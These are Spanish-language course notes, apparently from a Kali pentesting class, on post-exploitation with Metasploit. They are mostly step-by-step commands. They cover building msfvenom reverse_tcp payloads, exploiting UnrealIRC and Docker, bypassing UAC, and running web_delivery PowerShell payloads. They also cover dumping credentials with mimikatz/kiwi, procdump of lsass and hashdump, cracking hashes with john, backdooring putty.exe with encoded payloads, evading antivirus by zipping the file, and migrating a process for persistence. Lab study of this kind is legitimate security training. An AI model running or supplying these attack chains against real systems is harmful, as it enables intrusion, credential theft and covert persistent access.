# 04 KALI - Post-explotación

## Meterpreter para post-explotación

- Los módulos de explotación están en  /usr/share/metasploit-framework/modules/post
- Aqui vemos que hay módulos de post explotación para varios sistemas y aplicaciones
- Para establecer un meterpreter vamos a tener que explotar algunas de las vulnerabilidades del sistema
- Veamos primero con Ubuntu
- desde mi kali busco por la vulnerabilidad unrealirc

> msf> search unrealirc
> msf> use unreal/....
- Si entro en el exploit de irc_unreal y le pongo show payloads ninguno es un meterpreter, son cmds
- back para salir
- Creo un payload con msfvenom, le paso mi ip

> msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.16.128  lport=444

- Me devuelve en pantalla mi payload (todo lo que hay después de exec)
- Lo copio 
- Busco el exploit de unreal que ya tenia de antes y copio el código salvando las comillas simples con \ antes de la comillas simples
- Al principio debo colocar f'python -c"exec(...)
- Pongo a la escucha un handler

> msf> use exploit/multi/handler
> msf> show options
> msf> set lhost mi_IP
> msf> set lport 444
> msf> exploit

- Se queda a la escucha
- En otra consola, desde el path donde tengo el exploit lo lanzo a mi ip objetivo

> ./exploit.py 192.168.1.133 -payload python

- Se ha abierto la sesión meterpreter
- Hay que saber que tipo de usuario soy, user normal, admin, que privilegios tengo

> getuid

- En los módulos de post explotación en /post/linux/gather
- Tengo un modulo que es para ver si está corriendo en una máquina virtual
- Desde meterpreter

> meterpreter> run /post/linux/gather/checkvm

- Puedo tratar de hacer un dump de todos los hashes
> meterpreter> run /post/linux/gather/hashdump

- No tengo privilegios para hacerlo
- Puedo usar exploits locales para escalar privilegios
- Mando a un segundo plano el meterpreter

> meterpreter> background

- Puedo ver mis sesiones con sessions

> msf> session

- Puedo buscar con un sugeridor de exploits
> msf> use post/multi/recon/local_exploit_suggester
msf post(multi)> show options

- Lo que recibe es una sesión activa  

> msf post(multi) set session 1
> msf post(multi) exploit

- Hay un exploit para docker que si funciona

> msf> search doker_daemon
> msf> use 1 (docker daemon scalate privileges)
> msf> show options

- Es un exploit local, por lo que ya debo tener comprometida la máquina (es el caso)
- Me pide la sesión y el payload me pide el lhost y el lport
> msf> set session 1
- Le metemos otro payload que el que lleva

> msf> set payload linux/x86/meterpreter/reverse_tcp
> msf> set lhost MI_IP

- Esto intentará escalar privilegios y devolverme un meterpreter

>msf>exploit

- Esto ejecuta el exploit desde la session 1 que tenia abierta y me abre una session 2 con otro meterpreter

> meterpreter> getuid

- Ahora si puedo usar el hashdump!
-----

## Meterpreter post-explotación windows
 
- Vamos a usar otro módulo de metasploit que se llama web deliver y ejecutar un script manualmente desde windows para que nos devuelva unsa shell reversa
- Windows tiene la IP .137 
- En metasploit

> msf> use exploit/multi/script/web_delivery
> msf> show options

- me pide el payload, el lhost...nos generará el payload automáticamente que deberé ejecutar en la máquina destino

> msf> show targets
> msf> set target powershell
> msf> set payload windows/x64/meterpreter/reverse_tcp
> msf> set lhost IP_KALI
> exploit

- Me genera el payload en pantalla y me dice de ejcitarlo en la máquina objetivo para obtener una shell reversa
- Podría generar un ejecutable camuflado
- No hace falta configurar un listener
- Ejecuto el código en la powershell de windows
- me abre un meterpreter

> msf> session 1
> meterpreter> getuid
> meterpreter> getsystem -h (intentará subir privilegios)
- Voy a los modulos de post /usr/share/metasploit-framework/modules/post/windows
- Porque es util saber si es una máquina virtual? Puede ser un Honey Pot (trampa)

> run /post/windows/gather/hashdump

- Para conseguir permisos de admin mando esta sesión a background

> meterpreter> background

- Puedo hacer que metsploit me sugiera exploits
> msf> use post/multi/recon/local_exploit_suggester
> msf> set session 1
> msf> exploit

- A ver si asi averiguamos como podemos escalar privilegios
- Sugiere uac_bypass
> msf(local_exploit_suggester)> back
> msf> use uac/kñklñk
> msf(uac)> show options

- El uac de windows es el popup cuando pregunta si permites darle permisos a la shell para hacer cambios en el equipo
- El bypass nos permite saltarnos este uac
-----

## Elevación de privilegios UAC bypass

- Para escalar privilegios en windows, saltándonos el popo up de la power shell que salta para darle permisos como admin
- Esto funciona porque hay ciertos binarios en el SO de windows que hacen esta elevación de privilegios de forma automática
- Se pueden modificar los componentes que se cargan por estos programas de automatización de privegios

> msf> use exploit/multi/script/web-delivery
> msf(exploit/multi/script/web-delivery)> set payload windows/x64/meterpreter/reverse_tcp
> msf( exploit/multi/script/web-delivery)> show targets
> msf( exploit/multi/script/web-delivery)> set target 2 (power shell)
> msf( exploit/multi/script/web-delivery)> show options
> msf( exploit/multi/script/web-delivery)> set lhost MI IP
> msf( exploit/multi/script/web-delivery)> set lport 4444
> msf( exploit/multi/script/web-delivery)> exploit

- Copio el código que debo ejecutar en una powershell sin privilegios 
- Esto me abre un meterpreter en mi kali, pero soy user
- El exploit suggester proponia bypassUAC_dotnet_profiler
- Uso back para ir atrás

> msf> search uac
> msf> use 3
> msf> set session 1

- Seteo el host y el puerto con set lhost mi_IP y set lport puerto
>msf(uac_dotnet_profiler)

- Mi user ahora es del grupo de admin
- Uso getsystem para elevar mis privilegios

> getsystem
----

## Volcado de memoria Mimikatz 

- Ahora que tengo privilegios de admin en la máquina windows puedo hacer movimientos laterales a otros nodos
- Tratar de adivinar las credenciales de los usuarios logeados a esa máquina
- Este programa permite extraer passwords, hashes, pincodes, cualquier cosa de la memoria de windows. 
- Hace un volcado, los antivirus lo tienen bastante pillado
- Mimikatz tiene una implementación conectada con meterpreter
- El mismo proceso que antes para obtener el usuario de windows
- Para usar mimikatz

> meterpreter> load kiwi
> meterpreter> help kiwi
> meterpreter> creds all

- Cojo el hash, lo copio y voy a un crackeador de passwords en mi kali

> echo "hashlijdh8w9y9s8yhdushd" > hash.ntlm
> john hash.ntlm --format-NT --show
-----

## Procdump y lssas.exe

- Hay alternativas a mimikatz
- Donde se guardan los logons y todo lo relacionado a login es en lsass.exe
- Una vez comprometida la máquina y teniendo acceso a la interfaz gráfica
- Ctrl+alt+supr para acceder al administrador de tareas
- Details/lsass clic derecho: create dump file
- Con este fichero me lo llevo a mi lab y lo analizo con mimikatz
- Procdump es un binario de windows que sirve para hacer el volcado
- Lo puedo descargar desde microsoft
- Dede la cmd como admin 
> cd Procdump
> procdump64.exe -accepteula -ma lsass.exe lsass.dmp
- procdump puede hacer saltar el antivirus
- Con windows 10 no funciona
-------

## John de ripper & hashcat

- Cracking de passwords!
- Para la ayuda

> john -h
> hashcat -h

- Creo un  password hasheado, uso md5 de kali, le quito el guión y los espacios, lo guardo en hash.md5
> echo "1234" | md5sum | cut -f l -d " " > hash.md5

- A john le paso el formato y el archivo. Podría usar esto para que use el diccionario por defecto

> john --format-raw-md5 hash.md5 --show

- Para que use otro diccionario

> john --format-raw-md5 --show --word=/usr/share/wordlists/rockyou.txt hash.md5

- Debo usar show para quemuestre la contraseña en pantalla

### hashcat

- usar hashcat -h para ver las opciones!
- El -a es para espdecificar la técnica que se va a usar
- El -m será el tipo de hash
- En la wiki de hashcat salen los códios a usar
----

## Backdoors binarios

- Consiste en coger un ejecutable que el usuario use frecuentemente y vamos a inyectarle código malicioso patra que cada vez que sea ejecutado nos devuelva una conexión reversa
- El programa seguirá funcionando igual
- Es una de las maneras de ganar persistencia
- Los antivirus saben detectar muchos de los payloads hechos por msfvenom
- putty muy usado por los sysadmin
- Me descargo putty.exe (para 32 bits) de la red 
- uso msfvenom

> msfvenom -a x86 --platform windows -x putty.exe - k -p windows/meterpreter/reverse_tcp lhost=mi_ip lport=442 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe

- Para recibir la conexión reversa debo poner un listener en metasploit

> msf> use exploit/multi/handler
> msf> show options
> msf> set lhost mi_ip
> msf> set lport 442
> msf> set payload windows/meterpreter/reverse_tcp
> msf> set lhost mi_ip
> msf> set lport 442

- Si guardo el ejecutable malicioso en .zip windows no lo detecta
- Debería migrar este proceso a otro proceso para ganar persistencia y cuando se cierre la sesión de putty se pierda la conexión meterpreter
----

## Migración meterpereter a otro proceso

- Con este comando meterpreter migrará a otro proceso como notepad.exe 

> meterpreter> run post/windows/manage/migrate

- putty se cerrará pero yo seguiré teniendo acceso a la máquina+
- Windows 10 detectará con el antivirus este ejecutable malicioso